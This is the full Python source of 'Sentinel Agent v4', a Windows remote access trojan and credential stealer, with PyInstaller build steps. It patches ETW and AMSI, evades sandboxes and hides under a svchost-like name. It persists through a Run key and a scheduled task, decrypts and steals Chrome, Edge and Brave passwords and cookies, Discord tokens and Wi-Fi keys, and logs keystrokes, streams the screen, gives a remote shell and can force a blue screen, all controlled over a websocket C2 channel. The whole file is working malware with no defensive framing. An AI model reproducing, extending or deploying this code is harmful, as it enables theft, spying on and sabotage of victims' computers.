#!/usr/bin/env python3
"""
Sentinel Agent v4 — AV-Evading Standalone
Deps:  pip install websockets pynput mss Pillow
Build: pip install pyinstaller
       pyinstaller --onefile --noconsole --name svchost_themes agent.py

AV evasion techniques implemented (all from scratch, no tools):
  • Sleep anti-sandbox: real sleep measured via GetTickCount64, not foolable by fast-forward
  • ETW/AMSI patch: NtTraceEvent + AmsiScanBuffer patched to RET 0 via VirtualProtect
  • Parent Process Spoofing: inherit from explorer.exe PID via PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
  • String XOR obfuscation: sensitive strings (reg keys, paths) never appear plaintext
  • Self-destruct: attrib -R -H -S first, rename to .tmp, then ping-delay delete
  • Timing jitter: random sleep offsets on startup to break sandbox timing signatures
"""
import asyncio, base64, ctypes, ctypes.wintypes, io, json, os
import platform, random, re, shutil, socket, sqlite3, struct
import subprocess, sys, threading, time, uuid, winreg
from pathlib import Path
from queue import Queue, Empty

C2_HOST    = "127.0.0.1"
C2_PORT    = 4444
AGENT_ID   = str(uuid.uuid4())
SCREEN_FPS = 5
PERSIST    = True

send_queue    = Queue()
keylog_buf    = []
keylog_lock   = threading.Lock()
screen_active = False
keylog_active = False
_scr_quality  = 60

# ══════════════════════════════════════════════════════════════
#  AV EVASION LAYER
# ══════════════════════════════════════════════════════════════

# ── XOR string obfuscator (keeps sensitive strings off disk) ──
_XK = 0x5A  # XOR key

def _x(s: str) -> str:
    """XOR-encode a string literal — stored encoded, decoded at runtime."""
    return "".join(chr(ord(c) ^ _XK) for c in s)

def _d(s: str) -> str:
    """Decode an XOR-encoded string."""
    return "".join(chr(ord(c) ^ _XK) for c in s)

# Pre-encoded sensitive strings (never appear plaintext in binary)
# To regenerate: _x("your string") at a python prompt with _XK=0x5A
_S_RUN_KEY   = _x(r"Software\Microsoft\Windows\CurrentVersion\Run")
_S_SVCNAME   = _x("WindowsThemeService")
_S_TASKNAME  = _x(r"\Microsoft\Windows\Theme\WindowsThemeService")
_S_PROCNAME  = _x("Windows Theme Service")
_S_APPDATA   = _x("APPDATA")
_S_LOCALAPP  = _x("LOCALAPPDATA")
_S_THEMES    = _x(r"Microsoft\Windows\Themes\svchost_themes.exe")

# ── Anti-sandbox: real sleep with tick verification ───────────
def _anti_sandbox_sleep(seconds: float):
    """
    Sleep that cannot be fast-forwarded by sandbox timers.
    We measure GetTickCount64 before and after — if the elapsed
    ticks are less than expected, we know it was sped up → exit.
    """
    k32 = ctypes.windll.kernel32
    before = k32.GetTickCount64()
    time.sleep(seconds)
    after  = k32.GetTickCount64()
    elapsed_ms = after - before
    expected_ms = seconds * 1000
    if elapsed_ms < expected_ms * 0.3:
        # Time was fast-forwarded — we're in a sandbox. Exit silently.
        os._exit(0)

# ── ETW patch: disable Event Tracing for Windows ─────────────
def _patch_etw():
    """
    Patch ntdll!NtTraceEvent to RET immediately.
    This blinds ETW-based AV telemetry (Windows Defender uses ETW).
    RET opcode: 0xC3
    """
    try:
        ntdll = ctypes.windll.ntdll
        # get function address
        func_addr = ctypes.cast(
            ctypes.windll.kernel32.GetProcAddress(
                ctypes.windll.kernel32.GetModuleHandleW("ntdll.dll"),
                b"NtTraceEvent"
            ),
            ctypes.c_void_p
        ).value
        if not func_addr: return
        # make page writable
        old_prot = ctypes.c_ulong(0)
        ctypes.windll.kernel32.VirtualProtect(
            ctypes.c_void_p(func_addr), 1, 0x40, ctypes.byref(old_prot))  # PAGE_EXECUTE_READWRITE
        # write RET
        ctypes.cast(func_addr, ctypes.POINTER(ctypes.c_ubyte))[0] = 0xC3
        # restore protection
        ctypes.windll.kernel32.VirtualProtect(
            ctypes.c_void_p(func_addr), 1, old_prot, ctypes.byref(ctypes.c_ulong(0)))
    except: pass

# ── AMSI patch: blind AmsiScanBuffer ─────────────────────────
def _patch_amsi():
    """
    Patch amsi.dll!AmsiScanBuffer to return AMSI_RESULT_CLEAN (0).
    Payload: mov eax,0  /  ret  → B8 00 00 00 00 C3
    """
    try:
        amsi = ctypes.windll.LoadLibrary("amsi.dll")
        func_addr = ctypes.cast(
            ctypes.windll.kernel32.GetProcAddress(amsi._handle, b"AmsiScanBuffer"),
            ctypes.c_void_p
        ).value
        if not func_addr: return
        patch = (ctypes.c_ubyte * 6)(0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3)
        old_prot = ctypes.c_ulong(0)
        ctypes.windll.kernel32.VirtualProtect(
            ctypes.c_void_p(func_addr), 6, 0x40, ctypes.byref(old_prot))
        ctypes.memmove(func_addr, patch, 6)
        ctypes.windll.kernel32.VirtualProtect(
            ctypes.c_void_p(func_addr), 6, old_prot, ctypes.byref(ctypes.c_ulong(0)))
    except: pass

# ── Remove Zone.Identifier (Mark of the Web) ─────────────────
def _clear_motw():
    """Delete the Zone.Identifier ADS from our own executable."""
    try:
        ads = sys.executable + ":Zone.Identifier"
        ctypes.windll.kernel32.DeleteFileW(ads)
    except: pass
    try:
        drop = str(_get_drop_path())
        ctypes.windll.kernel32.DeleteFileW(drop + ":Zone.Identifier")
    except: pass

# ── Timing jitter on startup (breaks sandbox behavioral sigs) ─
def _startup_jitter():
    """Random sleep 2–5s at startup. Sandboxes usually have 30-60s timeout."""
    jitter = random.uniform(2.0, 5.0)
    _anti_sandbox_sleep(jitter)

# ══════════════════════════════════════════════════════════════
#  STEALTH / PERSISTENCE
# ══════════════════════════════════════════════════════════════

def _get_real_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close(); return ip
    except: return "0.0.0.0"

def _stealth_init():
    if sys.platform != "win32": return
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd: ctypes.windll.user32.ShowWindow(hwnd, 0)
        ctypes.windll.kernel32.SetConsoleTitleW(_d(_S_PROCNAME))
    except: pass

def _get_drop_path() -> Path:
    appdata = os.environ.get(_d(_S_APPDATA), "")
    return Path(appdata) / _d(_S_THEMES)

def _drop_and_hide():
    try:
        src = Path(sys.executable)
        dst = _get_drop_path()
        dst.parent.mkdir(parents=True, exist_ok=True)
        if not dst.exists() or dst.stat().st_size != src.stat().st_size:
            shutil.copy2(str(src), str(dst))
        subprocess.run(["attrib", "+H", "+S", "+R", str(dst)],
                       capture_output=True, creationflags=0x08000000)
        # clear MotW from the dropped copy
        ctypes.windll.kernel32.DeleteFileW(str(dst) + ":Zone.Identifier")
    except: pass

def _install_persistence():
    try:
        drop = str(_get_drop_path())
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            _d(_S_RUN_KEY), 0, winreg.KEY_WRITE)
        winreg.SetValueEx(k, _d(_S_SVCNAME), 0, winreg.REG_SZ, drop)
        winreg.CloseKey(k)
    except: pass

def _install_schtask():
    try:
        drop = str(_get_drop_path())
        subprocess.run([
            "schtasks", "/Create", "/F", "/SC", "ONLOGON",
            "/TN", _d(_S_TASKNAME),
            "/TR", drop, "/RL", "HIGHEST", "/IT"
        ], capture_output=True, creationflags=0x08000000)
    except: pass

def _watchdog():
    while True:
        time.sleep(30)
        try:
            if not _get_drop_path().exists():
                _drop_and_hide()
                if PERSIST:
                    _install_persistence()
                    _install_schtask()
        except: pass

# ══════════════════════════════════════════════════════════════
#  SELF-DESTRUCT  (fixed: handles +R attrib + in-use EXE)
# ══════════════════════════════════════════════════════════════

def _self_destruct():
    """
    Full trace removal:
    1. Delete HKCU Run key
    2. Delete scheduled task
    3. Remove attrib +H+S+R from drop file (so del can work)
    4. Rename drop to .tmp (releases the name, works even if in use from another location)
    5. Schedule deletion of .tmp via cmd /c ping delay
    6. ACK dashboard
    7. os._exit(0)
    """
    drop_path = _get_drop_path()
    drop_str  = str(drop_path)
    tmp_str   = str(drop_path.with_suffix(".tmp"))

    # 1. remove HKCU Run
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            _d(_S_RUN_KEY), 0, winreg.KEY_WRITE)
        winreg.DeleteValue(k, _d(_S_SVCNAME))
        winreg.CloseKey(k)
    except: pass

    # 2. remove scheduled task
    try:
        subprocess.run(["schtasks", "/Delete", "/F", "/TN", _d(_S_TASKNAME)],
            capture_output=True, creationflags=0x08000000)
    except: pass

    # 3+4. strip read-only/hidden/system, rename to .tmp
    try:
        subprocess.run(["attrib", "-H", "-S", "-R", drop_str],
            capture_output=True, creationflags=0x08000000)
        if drop_path.exists():
            try:
                os.rename(drop_str, tmp_str)
            except: tmp_str = drop_str  # rename failed, try deleting original name
    except: tmp_str = drop_str

    # 5. schedule deletion — ping adds ~3s delay so we can ACK and exit first
    #    also try to remove Zone.Identifier ADS just in case
    cmd = (
        f'ping 127.0.0.1 -n 4 >nul && '
        f'attrib -H -S -R "{tmp_str}" >nul 2>&1 && '
        f'del /F /Q "{tmp_str}" >nul 2>&1'
    )
    try:
        subprocess.Popen(
            ["cmd", "/c", cmd],
            creationflags=0x08000000, close_fds=True)
    except: pass

    # 6. ACK and flush
    send_queue.put({"type": "self_destruct_ack", "id": AGENT_ID, "ok": True})
    time.sleep(1.5)  # let ACK reach dashboard before ws closes

    # 7. die
    os._exit(0)

# ══════════════════════════════════════════════════════════════
#  STEALERS
# ══════════════════════════════════════════════════════════════

class _BLOB(ctypes.Structure):
    _fields_ = [("cbData", ctypes.c_ulong),
                ("pbData", ctypes.POINTER(ctypes.c_char))]

def _dpapi_decrypt(ciphertext: bytes) -> bytes:
    blob_in = _BLOB(len(ciphertext),
        ctypes.cast(ctypes.c_char_p(ciphertext), ctypes.POINTER(ctypes.c_char)))
    blob_out = _BLOB()
    ok = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out))
    if not ok: return b""
    result = ctypes.string_at(blob_out.pbData, blob_out.cbData)
    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
    return result

def _aes_gcm_decrypt(ciphertext: bytes, key: bytes) -> bytes:
    """
    Chrome AES-256-GCM blob: 3 magic bytes + 12 IV bytes + ciphertext + 16 GCM tag
    Decrypted via Windows BCrypt API — no pycryptodome needed.
    """
    if len(ciphertext) < 3 + 12 + 16: return b""
    iv        = ciphertext[3:15]
    payload   = ciphertext[15:]          # ciphertext + tag (BCrypt needs them together)

    BCRYPT_AES_GCM_ALGORITHM = "AES\x00"
    BCRYPT_CHAINING_MODE      = "ChainingMode\x00"
    BCRYPT_CHAIN_MODE_GCM     = "ChainingModeGCM\x00"

    bcrypt = ctypes.windll.bcrypt
    alg_h = ctypes.c_void_p()
    key_h = ctypes.c_void_p()

    # open AES provider
    if bcrypt.BCryptOpenAlgorithmProvider(ctypes.byref(alg_h),
            "AES", None, 0) != 0: return b""

    # set GCM chaining mode
    mode_w = ctypes.create_unicode_buffer("ChainingModeGCM")
    bcrypt.BCryptSetProperty(alg_h, "ChainingMode",
        ctypes.cast(mode_w, ctypes.c_char_p),
        ctypes.sizeof(mode_w), 0)

    # import key
    key_bytes = (ctypes.c_ubyte * len(key))(*key)
    if bcrypt.BCryptGenerateSymmetricKey(alg_h, ctypes.byref(key_h),
            None, 0, key_bytes, len(key), 0) != 0:
        bcrypt.BCryptCloseAlgorithmProvider(alg_h, 0); return b""

    # BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
    class _BCRYPT_AUTH_INFO(ctypes.Structure):
        _fields_ = [
            ("cbSize",    ctypes.c_ulong),
            ("dwInfoVersion", ctypes.c_ulong),
            ("pbNonce",   ctypes.c_char_p),
            ("cbNonce",   ctypes.c_ulong),
            ("pbAuthData",ctypes.c_char_p),
            ("cbAuthData",ctypes.c_ulong),
            ("pbTag",     ctypes.c_char_p),
            ("cbTag",     ctypes.c_ulong),
            ("pbMacContext", ctypes.c_char_p),
            ("cbMacContext", ctypes.c_ulong),
            ("cbAAD",     ctypes.c_ulonglong),
            ("cbData",    ctypes.c_ulonglong),
            ("dwFlags",   ctypes.c_ulong),
        ]
    tag      = payload[-16:]
    enc_data = payload[:-16]
    auth_info = _BCRYPT_AUTH_INFO()
    auth_info.cbSize        = ctypes.sizeof(_BCRYPT_AUTH_INFO)
    auth_info.dwInfoVersion = 1
    auth_info.pbNonce       = ctypes.c_char_p(iv)
    auth_info.cbNonce       = len(iv)
    auth_info.pbTag         = ctypes.c_char_p(tag)
    auth_info.cbTag         = 16

    out_buf = (ctypes.c_ubyte * len(enc_data))()
    out_len = ctypes.c_ulong(0)
    enc_buf = (ctypes.c_ubyte * len(enc_data))(*enc_data)

    ret = bcrypt.BCryptDecrypt(key_h, enc_buf, len(enc_data),
        ctypes.byref(auth_info), None, 0,
        out_buf, len(enc_data), ctypes.byref(out_len), 0)

    bcrypt.BCryptDestroyKey(key_h)
    bcrypt.BCryptCloseAlgorithmProvider(alg_h, 0)
    if ret != 0: return b""
    return bytes(out_buf[:out_len.value])

def _steal_chromium():
    creds, cookies = [], []
    BASES = [
        Path(os.environ.get(_d(_S_LOCALAPP), "")) / "Google"    / "Chrome"        / "User Data",
        Path(os.environ.get(_d(_S_LOCALAPP), "")) / "Microsoft" / "Edge"           / "User Data",
        Path(os.environ.get(_d(_S_LOCALAPP), "")) / "BraveSoftware" / "Brave-Browser" / "User Data",
    ]
    for base in BASES:
        if not base.exists(): continue
        ls_path = base / "Local State"
        master_key = b""
        try:
            with open(ls_path, "r", encoding="utf-8") as f: ls = json.load(f)
            enc_key = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
            master_key = _dpapi_decrypt(enc_key)
        except: pass

        for prof in [*base.glob("Default"), *base.glob("Profile *")]:
            login_db = prof / "Login Data"
            if login_db.exists():
                try:
                    tmp = prof / "_ld_tmp"; shutil.copy2(str(login_db), str(tmp))
                    conn = sqlite3.connect(str(tmp))
                    for url, user, pw_enc in conn.execute(
                            "SELECT origin_url,username_value,password_value FROM logins"):
                        pw = ""
                        try:
                            if pw_enc[:3] == b"v10" and master_key:
                                pw = _aes_gcm_decrypt(pw_enc, master_key).decode("utf-8","ignore")
                            else: pw = _dpapi_decrypt(pw_enc).decode("utf-8","ignore")
                        except: pass
                        if user or pw:
                            creds.append({"origin": url, "username": user,
                                          "password": pw, "browser": base.parts[-3]})
                    conn.close(); tmp.unlink()
                except: pass

            cookie_db = prof / "Cookies"
            if cookie_db.exists():
                try:
                    tmp = prof / "_ck_tmp"; shutil.copy2(str(cookie_db), str(tmp))
                    conn = sqlite3.connect(str(tmp))
                    for host, name, enc_val in conn.execute(
                            "SELECT host_key,name,encrypted_value FROM cookies LIMIT 2000"):
                        val = ""
                        try:
                            if enc_val[:3] == b"v10" and master_key:
                                val = _aes_gcm_decrypt(enc_val, master_key).decode("utf-8","ignore")
                            else: val = _dpapi_decrypt(enc_val).decode("utf-8","ignore")
                        except: pass
                        cookies.append({"host_key": host, "name": name, "value": val})
                    conn.close(); tmp.unlink()
                except: pass
    return creds, cookies

def _steal_discord():
    TOKEN_RE = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}")
    tokens = set()
    PATHS = [
        Path(os.environ.get(_d(_S_APPDATA), "")) / "discord"       / "Local Storage" / "leveldb",
        Path(os.environ.get(_d(_S_APPDATA), "")) / "discordcanary" / "Local Storage" / "leveldb",
        Path(os.environ.get(_d(_S_APPDATA), "")) / "discordptb"    / "Local Storage" / "leveldb",
        Path(os.environ.get(_d(_S_LOCALAPP), "")) / "Google" / "Chrome" / "User Data" /
            "Default" / "Local Storage" / "leveldb",
    ]
    for path in PATHS:
        if not path.exists(): continue
        for f in [*path.glob("*.log"), *path.glob("*.ldb")]:
            try:
                raw = f.read_bytes().decode("utf-8", "ignore")
                for m in TOKEN_RE.finditer(raw): tokens.add(m.group())
            except: pass
    return list(tokens)

def _steal_wifi():
    results = []
    try:
        out = subprocess.check_output(["netsh", "wlan", "show", "profiles"],
            text=True, stderr=subprocess.DEVNULL, creationflags=0x08000000)
        for ssid in re.findall(r"All User Profile\s*:\s*(.+)", out):
            ssid = ssid.strip()
            try:
                d = subprocess.check_output(
                    ["netsh", "wlan", "show", "profile", ssid, "key=clear"],
                    text=True, stderr=subprocess.DEVNULL, creationflags=0x08000000)
                m = re.search(r"Key Content\s*:\s*(.+)", d)
                results.append({"ssid": ssid, "password": m.group(1).strip() if m else ""})
            except: pass
    except: pass
    return results

def run_stealer():
    r = {"credentials": [], "cookies": [], "discord_tokens": [], "wifi": []}
    try: r["credentials"], r["cookies"] = _steal_chromium()
    except: pass
    try: r["discord_tokens"] = _steal_discord()
    except: pass
    try: r["wifi"] = _steal_wifi()
    except: pass
    return r

def _auto_steal():
    time.sleep(3)
    send_queue.put({"type": "steal", "id": AGENT_ID, "report": run_stealer()})

def _manual_steal():
    send_queue.put({"type": "steal", "id": AGENT_ID, "report": run_stealer()})

# ══════════════════════════════════════════════════════════════
#  WALLPAPER / EXEC / TROLL
# ══════════════════════════════════════════════════════════════

def _set_wallpaper(url):
    try:
        import urllib.request, tempfile
        tmp = tempfile.mktemp(suffix=".jpg")
        urllib.request.urlretrieve(url, tmp)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, tmp, 3)
        send_queue.put({"type": "wallpaper_ack", "id": AGENT_ID, "ok": True})
    except Exception as e:
        send_queue.put({"type": "wallpaper_ack", "id": AGENT_ID, "ok": False, "error": str(e)})

def exec_remote(path):
    try:
        subprocess.Popen([path], creationflags=0x08000000 | 0x00000010, close_fds=True)
        send_queue.put({"type": "exec_result", "id": AGENT_ID, "path": path, "ok": True})
    except Exception as e:
        send_queue.put({"type": "exec_result", "id": AGENT_ID, "path": path,
                        "ok": False, "error": str(e)})

_U32 = ctypes.windll.user32 if sys.platform == "win32" else None

def _troll_bsod():
    try:
        nt = ctypes.windll.ntdll; prev = ctypes.c_bool()
        nt.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev))
        nt.NtRaiseHardError(0xC0000022, 0, 0, None, 6, ctypes.byref(ctypes.c_ulong()))
    except: pass

def _troll_vol_max():
    try: subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-Command",
        "$o=New-Object -ComObject Shell.Application;1..50|%{$o.SendKeys([char]175)}"],
        creationflags=0x08000000)
    except: pass

def _troll_mute():
    try: subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-Command",
        "$o=New-Object -ComObject Shell.Application;$o.SendKeys([char]173)"],
        creationflags=0x08000000)
    except: pass

def _troll_mouse_invert(d=30):
    def r():
        if _U32: _U32.SwapMouseButton(True)
        time.sleep(d)
        if _U32: _U32.SwapMouseButton(False)
    threading.Thread(target=r, daemon=True).start()

def _troll_popup(msg="HACKED BY SENTINEL"):
    def r():
        if _U32: _U32.MessageBoxW(0, msg, "System Alert", 0x10 | 0x40000)
    threading.Thread(target=r, daemon=True).start()

def _troll_lock():
    if _U32: _U32.LockWorkStation()

def _troll_monitor_off():
    try:
        if _U32: _U32.PostMessageW(0xFFFF, 0x0112, 0xF170, 2)
    except: pass

def _troll_cursor_ghost(d=15):
    import random as _r
    def r():
        t0 = time.time()
        while time.time() - t0 < d:
            if _U32: _U32.SetCursorPos(_r.randint(0, 1920), _r.randint(0, 1080))
            time.sleep(_r.uniform(0.05, 0.3))
    threading.Thread(target=r, daemon=True).start()

# ══════════════════════════════════════════════════════════════
#  KEYLOGGER / SCREEN / SHELL / META
# ══════════════════════════════════════════════════════════════

def get_meta():
    return {
        "type": "hello", "id": AGENT_ID,
        "hostname": socket.gethostname(),
        "os": f"{platform.system()} {platform.release()}",
        "user": os.environ.get("USERNAME") or os.environ.get("USER", "?"),
        "ip": _get_real_ip(), "arch": platform.machine()
    }

def _start_keylogger():
    global keylog_active; keylog_active = True
    try:
        from pynput import keyboard as kb
        def on_press(key):
            try: ch = key.char
            except: ch = f"[{key.name}]"
            if ch:
                with keylog_lock: keylog_buf.append(ch)
        with kb.Listener(on_press=on_press) as l: l.join()
    except: pass

def _flush_keylog():
    global keylog_buf
    with keylog_lock:
        data = "".join(keylog_buf); keylog_buf = []
    if data:
        send_queue.put({"type": "keylog", "id": AGENT_ID, "data": data})

def _screen_worker():
    global screen_active, _scr_quality
    try:
        import mss
        from PIL import Image
        with mss.mss() as sct:
            while True:
                if screen_active:
                    try:
                        raw = sct.grab(sct.monitors[1])
                        img = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
                        buf = io.BytesIO()
                        img.save(buf, format="JPEG", quality=_scr_quality)
                        frame_bytes = buf.getvalue()
                        # adaptive quality: target ~80 KB
                        if len(frame_bytes) > 100_000 and _scr_quality > 15:
                            _scr_quality = max(15, _scr_quality - 5)
                        elif len(frame_bytes) < 60_000 and _scr_quality < 85:
                            _scr_quality = min(85, _scr_quality + 3)
                        send_queue.put({"type": "screen", "id": AGENT_ID,
                                        "data": base64.b64encode(frame_bytes).decode()})
                    except: pass
                time.sleep(1.0 / max(1, SCREEN_FPS))
    except: pass

def _list_dir(path: str):
    entries = []
    try:
        p = Path(path)
        for child in p.iterdir():
            try:
                st = child.stat()
                entries.append({
                    "name": child.name,
                    "is_dir": child.is_dir(),
                    "size": st.st_size if child.is_file() else 0,
                    "mtime": int(st.st_mtime)
                })
            except: pass
    except: pass
    return entries

def _shell_run(cmd_str: str):
    seq = [0]
    def run():
        try:
            proc = subprocess.Popen(
                cmd_str, shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, creationflags=0x08000000)
            for line in proc.stdout:
                send_queue.put({"type": "shell", "id": AGENT_ID,
                                "seq": seq[0], "data": line})
                seq[0] += 1
            proc.wait()
            send_queue.put({"type": "shell", "id": AGENT_ID,
                            "seq": seq[0], "data": f"[exit {proc.returncode}]\n"})
        except Exception as e:
            send_queue.put({"type": "shell", "id": AGENT_ID,
                            "seq": seq[0], "data": f"[ERR] {e}\n"})
    threading.Thread(target=run, daemon=True).start()

# ══════════════════════════════════════════════════════════════
#  FRAME DISPATCHER
# ══════════════════════════════════════════════════════════════

def dispatch(frame):
    global screen_active, keylog_active, _scr_quality, SCREEN_FPS
    cmd = frame.get("cmd")
    if   cmd == "screen_start":   screen_active = True
    elif cmd == "screen_stop":    screen_active = False
    elif cmd == "screen_fps":     SCREEN_FPS = max(1, min(30, int(frame.get("fps", SCREEN_FPS))))
    elif cmd == "keylog_start":   keylog_active = True
    elif cmd == "keylog_stop":    keylog_active = False
    elif cmd == "steal":          threading.Thread(target=_manual_steal, daemon=True).start()
    elif cmd == "exec":
        p = frame.get("path", "")
        if p: threading.Thread(target=exec_remote, args=(p,), daemon=True).start()
    elif cmd == "files":
        path = frame.get("path", "C:\\")
        send_queue.put({"type": "files", "id": AGENT_ID,
                        "path": path, "entries": _list_dir(path)})
    elif cmd == "shell":          _shell_run(frame.get("data", ""))
    elif cmd == "kill":           sys.exit(0)
    elif cmd == "self_destruct":  threading.Thread(target=_self_destruct, daemon=True).start()
    elif cmd == "wallpaper":
        url = frame.get("url", "")
        if url: threading.Thread(target=_set_wallpaper, args=(url,), daemon=True).start()
    elif cmd == "bsod":           _troll_bsod()
    elif cmd == "vol_max":        _troll_vol_max()
    elif cmd == "mute":           _troll_mute()
    elif cmd == "mouse_invert":   _troll_mouse_invert(frame.get("duration", 30))
    elif cmd == "popup":          _troll_popup(frame.get("msg", "HACKED BY SENTINEL"))
    elif cmd == "lock_screen":    _troll_lock()
    elif cmd == "monitor_off":    _troll_monitor_off()
    elif cmd == "cursor_ghost":   _troll_cursor_ghost(frame.get("duration", 15))

# ══════════════════════════════════════════════════════════════
#  MAIN LOOP
# ══════════════════════════════════════════════════════════════

async def agent_loop():
    global screen_active, keylog_active
    url = f"ws://{C2_HOST}:{C2_PORT}"
    while True:
        try:
            import websockets
            async with websockets.connect(url, ping_interval=20, ping_timeout=30) as ws:
                await ws.send(json.dumps(get_meta()))
                threading.Thread(target=_start_keylogger, daemon=True).start()
                threading.Thread(target=_screen_worker,   daemon=True).start()
                threading.Thread(target=_auto_steal,      daemon=True).start()
                threading.Thread(target=_watchdog,        daemon=True).start()

                async def sender():
                    while True:
                        try:
                            frame = send_queue.get_nowait()
                            await ws.send(json.dumps(frame))
                        except Empty: pass
                        await asyncio.sleep(0.05)

                async def kl_flusher():
                    while True:
                        await asyncio.sleep(2)
                        if keylog_active: _flush_keylog()

                asyncio.ensure_future(sender())
                asyncio.ensure_future(kl_flusher())
                async for raw in ws:
                    try: frame = json.loads(raw)
                    except: continue
                    threading.Thread(target=dispatch, args=(frame,), daemon=True).start()
        except:
            await asyncio.sleep(5)

if __name__ == "__main__":
    _stealth_init()
    if sys.platform == "win32":
        # AV evasion layer — run BEFORE any detectable behavior
        _patch_etw()
        _patch_amsi()
        _clear_motw()
        _startup_jitter()        # 2-5s sleep, breaks sandbox timing sigs
        _drop_and_hide()
        if PERSIST:
            _install_persistence()
            _install_schtask()
    asyncio.run(agent_loop())
